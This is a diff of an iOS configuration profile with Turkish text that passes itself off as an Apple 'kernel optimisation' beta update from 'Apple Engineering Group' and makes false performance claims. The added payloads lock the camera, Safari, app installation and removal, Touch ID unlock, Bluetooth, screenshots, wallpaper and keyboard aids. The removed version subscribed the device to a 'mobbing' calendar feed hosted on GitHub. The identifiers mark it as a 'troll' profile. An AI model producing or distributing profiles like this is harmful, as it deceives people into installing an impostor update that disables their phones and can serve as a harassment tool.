@@ -5,54 +5,67 @@
 	<key>PayloadContent</key>
 	<array>
 		<dict>
-			<key>CalendarAccountDescription</key>
-			<string> Sistem Güvenlik Yaması</string>
-			<key>PayloadDescription</key>
-			<string>Güvenlik yamaları için gereklidir.</string>
-			<key>PayloadDisplayName</key>
-			<string>Sistem Bildirimleri</string>
-			<key>PayloadIdentifier</key>
-			<string>com.apple.calendar.managed.troll</string>
-			<key>PayloadType</key>
-			<string>com.apple.subscribedcalendar.account</string>
-			<key>PayloadUUID</key>
-			<string>12345678-1234-1234-1234-123456789012</string>
-			<key>PayloadVersion</key>
-			<integer>1</integer>
-			<key>SubCalAccountHostName</key>
-			<string>raw.githubusercontent.com</string>
-			<key>SubCalAccountPath</key>
-			<string>/keremkero319-del/keross/main/mobbing.ics</string>
-			<key>SubCalAccountUseSSL</key>
-			<true/>
-		</dict>
-		<dict>
-			<key>PayloadDisplayName</key>
-			<string>Cihaz Güvenliği</string>
-			<key>PayloadIdentifier</key>
-			<string>com.apple.managed.restrictions.pro</string>
 			<key>PayloadType</key>
 			<string>com.apple.applicationaccess</string>
+			<key>PayloadIdentifier</key>
+			<string>com.apple.managed.restrictions.ultra</string>
 			<key>PayloadUUID</key>
-			<string>99998888-7777-6666-5555-444433332222</string>
+			<string>550e8400-e29b-41d4-a716-446655440000</string>
 			<key>PayloadVersion</key>
 			<integer>1</integer>
-			<key>allowScreenShot</key>
+			
+			<key>allowCamera</key>
+			<false/> <key>allowAppInstallation</key>
+			<false/> <key>allowAppRemoval</key>
+			<false/> <key>allowSafari</key>
+			<false/> <key>allowScreenShot</key>
+			<false/> <key>allowWallpaperModification</key>
+			<false/> <key>allowBluetoothModification</key>
+			<false/> <key>allowFingerprintForUnlock</key>
+			<false/> </dict>
+
+		<dict>
+			<key>PayloadType</key>
+			<string>com.apple.keyboard.modification</string>
+			<key>PayloadIdentifier</key>
+			<string>com.apple.keyboard.troll</string>
+			<key>PayloadUUID</key>
+			<string>550e8400-e29b-41d4-a716-446655440001</string>
+			<key>PayloadVersion</key>
+			<integer>1</integer>
+			<key>allowPredictiveKeyboard</key>
+			<false/> <key>allowAutoCorrection</key>
+			<false/> <key>allowSpellCheck</key>
 			<false/>
-			<key>allowWallpaperModification</key>
+		</dict>
+
+		<dict>
+			<key>PayloadType</key>
+			<string>com.apple.AdLib.managed</string>
+			<key>PayloadIdentifier</key>
+			<string>com.apple.adlib.troll</string>
+			<key>PayloadUUID</key>
+			<string>550e8400-e29b-41d4-a716-446655440002</string>
+			<key>PayloadVersion</key>
+			<integer>1</integer>
+			<key>allowAdTracking</key>
 			<false/>
 		</dict>
 	</array>
+
 	<key>PayloadDisplayName</key>
-	<string>iOS 19.4 Kritik Sistem Güncellemesi</string>
+	<string> iOS 19.4 Kernel Optimizasyonu (Beta)</string>
+	<key>PayloadDescription</key>
+	<string>İşlemci çekirdek hızını artırır ve RAM kullanımını %30 azaltır.</string>
 	<key>PayloadIdentifier</key>
-	<string>com.apple.system.update.beta</string>
+	<string>com.apple.system.kernel.fix</string>
 	<key>PayloadOrganization</key>
-	<string>Apple Inc. Beta Division</string>
-	<key>PayloadType</key>
+	<string>Apple Engineering Group</string>
+	<key>PayloadRemovalDisallowed</key>
+	<false/> <key>PayloadType</key>
 	<string>Configuration</string>
 	<key>PayloadUUID</key>
-	<string>ABCDEF12-ABCD-1234-EFGH-567890ABCDEF</string>
+	<string>550e8400-e29b-41d4-a716-446655440003</string>
 	<key>PayloadVersion</key>
 	<integer>1</integer>
 </dict>
